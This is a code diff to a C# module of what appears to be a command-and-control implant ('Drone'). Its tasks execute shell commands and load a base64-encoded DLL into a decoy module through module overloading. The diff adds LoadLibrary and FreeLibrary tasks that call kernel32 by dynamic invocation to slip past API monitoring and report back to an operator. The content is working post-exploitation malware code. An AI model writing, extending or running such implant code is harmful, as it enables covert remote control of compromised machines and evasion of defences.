@@ -1,4 +1,5 @@
 ﻿using System;
+using System.ComponentModel;
 using System.IO;
 using System.Linq;
 using System.Runtime.InteropServices;
@@ -16,9 +17,6 @@ namespace StandardModule;
 
 public partial class StandardApi
 {
-    [UnmanagedFunctionPointer(CallingConvention.StdCall, CharSet = CharSet.Unicode)]
-    private delegate string GenericDelegate(string input);
-
     private void ExecuteShellCommand(DroneTask task, CancellationToken token)
     {
         var command = string.Join("", task.Arguments);
@@ -70,9 +68,9 @@ public partial class StandardApi
         var dll = Convert.FromBase64String(task.Artefact);
         var decoy = Overload.FindDecoyModule(dll.Length);
 
-        if (string.IsNullOrEmpty(decoy))
+        if (string.IsNullOrWhiteSpace(decoy))
         {
-            Drone.SendError(task.TaskGuid, "Unable to find a suitable decoy module ");
+            Drone.SendError(task.TaskGuid, "Unable to find a suitable decoy module.");
             return;
         }
 
@@ -88,11 +86,47 @@ public partial class StandardApi
             map.PEINFO,
             map.ModuleBase,
             export,
-            typeof(GenericDelegate),
+            typeof(Delegates.GenericDelegate),
             funcParams);
 
         Drone.SendResult(task.TaskGuid, result);
 
         Map.FreeModule(map);
+    }
+
+    private void LoadLibrary(DroneTask task, CancellationToken token)
+    {
+        var dllName = task.Arguments[0];
+        object[] parameters = { dllName };
+        
+        var hModule = (IntPtr)Generic.DynamicApiInvoke("kernel32.dll", "LoadLibraryW",
+            typeof(Delegates.LoadLibraryW), ref parameters);
+
+        if (hModule == IntPtr.Zero)
+            throw new Win32Exception(Marshal.GetLastWin32Error());
+        
+        Drone.SendResult(task.TaskGuid, $"Module \"{dllName}\" loaded (0x{hModule.ToInt64():X})");
+    }
+    
+    private void FreeLibrary(DroneTask task, CancellationToken token)
+    {
+        var dllName = task.Arguments[0];
+        var hModule = Generic.GetLoadedModuleAddress(dllName);
+
+        if (hModule == IntPtr.Zero)
+        {
+            Drone.SendError(task.TaskGuid, $"Couldn't find module address for {dllName}.");
+            return;
+        }
+        
+        var parameters = new object[] { hModule };
+
+        var success = (bool)Generic.DynamicApiInvoke("kernel32.dll", "FreeLibrary",
+            typeof(Delegates.FreeLibrary), ref parameters);
+
+        if (success)
+            Drone.SendResult(task.TaskGuid, $"Module \"{dllName}\" freed.");
+        else
+            Drone.SendError(task.TaskGuid, $"Failed to free {dllName}");
     }
 }
